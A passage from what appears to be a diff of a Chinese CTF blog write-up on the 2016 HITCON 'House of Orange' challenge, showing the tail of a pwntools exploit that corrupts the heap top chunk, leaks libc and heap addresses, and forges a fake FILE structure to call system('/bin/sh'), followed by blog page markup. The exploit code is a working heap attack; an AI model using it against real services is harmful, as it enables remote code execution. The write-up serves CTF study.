class="line">	p.recvuntil(<span class="string">&apos;Your choice : &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Length of name :&apos;</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Name :&apos;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Price of Orange:&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Color of Orange:&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Finish&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice :&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(length,name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice :&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Length of name :&apos;</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Name:&apos;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Price of Orange: &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Color of Orange: &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Finish&apos;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="comment">#step1. alter the top chunk&apos;s size</span></span><br><span class="line">	build(<span class="number">0x10</span>,<span class="string">&apos;aaaa&apos;</span>)</span><br><span class="line">	payload = <span class="string">&apos;a&apos;</span>*<span class="number">0x18</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xfa1</span>)</span><br><span class="line">	upgrade(<span class="number">0x100</span>,payload)</span><br><span class="line">	build(<span class="number">0x1000</span>,<span class="string">&apos;cccccccc&apos;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#step2. leak the address</span></span><br><span class="line">	build(<span class="number">0x400</span>,<span class="string">&apos;aaaaaaaa&apos;</span>)	<span class="comment">#chunk*</span></span><br><span class="line">	see()</span><br><span class="line">	p.recvuntil(<span class="string">&apos;a&apos;</span>*<span class="number">8</span>)</span><br><span class="line">	addr = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>))</span><br><span class="line">	libc_base = addr <span class="number">-0x3C4B20</span><span class="number">-1640</span></span><br><span class="line">	log.success(<span class="string">&apos;libc_base:&apos;</span>+hex(libc_base))</span><br><span class="line">	system_addr = libc_base + libc.symbols[<span class="string">&apos;system&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;system_addr: &apos;</span>+hex(system_addr))</span><br><span class="line">	upgrade(<span class="number">0x400</span>,<span class="string">&apos;a&apos;</span>*<span class="number">16</span>)</span><br><span class="line">	see()</span><br><span class="line">	p.recvuntil(<span class="string">&apos;a&apos;</span>*<span class="number">16</span>)</span><br><span class="line">	heap_base = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>))<span class="number">-0xc0</span></span><br><span class="line">	log.success(<span class="string">&apos;chunk_addr: &apos;</span>+hex(heap_base))</span><br><span class="line"></span><br><span class="line">	IO_list_all_addr = libc_base+libc.symbols[<span class="string">&apos;_IO_list_all&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;IO_list_all_addr: &apos;</span>+hex(IO_list_all_addr))</span><br><span class="line">	payload = <span class="string">&apos;a&apos;</span>*<span class="number">0x400</span></span><br><span class="line">	payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x1f</span>)+p64(<span class="number">0</span>)	</span><br><span class="line"></span><br><span class="line">  <span class="comment">#step3. forge data</span></span><br><span class="line">	fake_file = <span class="string">&apos;/bin/sh\x00&apos;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>) + p64(IO_list_all_addr<span class="number">-0x10</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">	fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&apos;\x00&apos;</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>) <span class="comment">#mode&lt;=0</span></span><br><span class="line">	fake_file += p64(<span class="number">0</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>)</span><br><span class="line">	fake_file += p64(heap_base+<span class="number">0x5d0</span>)<span class="comment">#pointer to vtable</span></span><br><span class="line">	payload += fake_file</span><br><span class="line">	payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># vtable</span></span><br><span class="line">	payload += p64(system_addr)<span class="comment">#_IO_OVERFLOW</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#step4. attack</span></span><br><span class="line">	upgrade(<span class="number">0x800</span>,payload)	</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice : &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
 <h2 id="0x07-REFFERENCE"><a href="#0x07-REFFERENCE" class="headerlink" title="0x07 REFFERENCE"></a>0x07 REFFERENCE</h2><p>[&#x7406;&#x89E3; glibc malloc&#xFF1A;malloc() &#x4E0E; free() &#x539F;&#x7406;&#x56FE;&#x89E3;]<a href="https://blog.csdn.net/maokelong95/article/details/52006379" target="_blank" rel="noopener">https://blog.csdn.net/maokelong95/article/details/52006379</a></p>
-</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Po1lux</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2019/03/27/2016-Hitcon-House-of-Orange/">http://yoursite.com/2019/03/27/2016-Hitcon-House-of-Orange/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com">Po1lux's Diary</a>！</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/03/29/House-of-Orange在2-24glibc下的利用/"><i class="fa fa-chevron-left">  </i><span>House_of_Orange在2.24glibc下的利用</span></a></div><div class="next-post pull-right"><a href="/2019/03/24/2018-SUCTF-Heap-[off by one,unlink]/"><span>2018-SUCTF-Heap-[off by one,unlink]</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/Po1lux/Po1lux.github.io/hexo/source/images/IMG_3035.JPG)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By Po1lux</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
-  $('#nav').addClass('is-mobile')
-  $('footer').addClass('is-mobile')
-}</script></body></html>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/24/2018-SUCTF-Heap-[off by one,unlink]/" rel="next" title="2018-SUCTF-Heap-[off by one,unlink]">
+                <i class="fa fa-chevron-left"></i> 2018-SUCTF-Heap-[off by one,unlink]
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/29/House-of-Orange在2-24glibc下的利用/" rel="prev" title="House_of_Orange在2.24glibc下的利用">
+                House_of_Orange在2.24glibc下的利用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/IMG.jpg" alt="Po1lux">
+            
+              <p class="site-author-name" itemprop="name">Po1lux</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">56</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xn--74q78i15hxv3arigm4e.cn" title="嘉神川克罗艾" target="_blank">嘉神川克罗艾</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-FILE、-IO-FILE、-IO-FILE-plus、-IO-list-all、vtable是什么"><span class="nav-number">1.</span> <span class="nav-text">0x00 FILE、_IO_FILE、_IO_FILE_plus、_IO_list_all、vtable是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-为什么unsortedbin中的chunk会变成smallbin-chunk，以及unsortedbin-attack的说明"><span class="nav-number">2.</span> <span class="nav-text">0x01 为什么unsortedbin中的chunk会变成smallbin chunk，以及unsortedbin attack的说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-为什么要让topchunk以brk的方式扩容"><span class="nav-number">3.</span> <span class="nav-text">0x02 为什么要让topchunk以brk的方式扩容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-为什么chunk中会泄露libc和chunk的地址"><span class="nav-number">4.</span> <span class="nav-text">0x03 为什么chunk中会泄露libc和chunk的地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-House-of-Orange程序分析"><span class="nav-number">5.</span> <span class="nav-text">0x04 House of Orange程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-利用过程FSOP-File-Stream-Oriented-Programming"><span class="nav-number">6.</span> <span class="nav-text">0x05 利用过程FSOP(File Stream Oriented Programming)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用的触发点"><span class="nav-number">6.1.</span> <span class="nav-text">利用的触发点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用条件"><span class="nav-number">6.2.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用过程"><span class="nav-number">6.3.</span> <span class="nav-text">利用过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-EXP"><span class="nav-number">7.</span> <span class="nav-text">0x06 EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-REFFERENCE"><span class="nav-number">8.</span> <span class="nav-text">0x07 REFFERENCE</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Po1lux</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '18YVWKzBgzb7zbj1Fmt6ipCC-gzGzoHsz',
+        appKey: 'mPl8Laz5VD56ciWT9PwYKa8n',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("18YVWKzBgzb7zbj1Fmt6ipCC-gzGzoHsz", "mPl8Laz5VD56ciWT9PwYKa8n");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
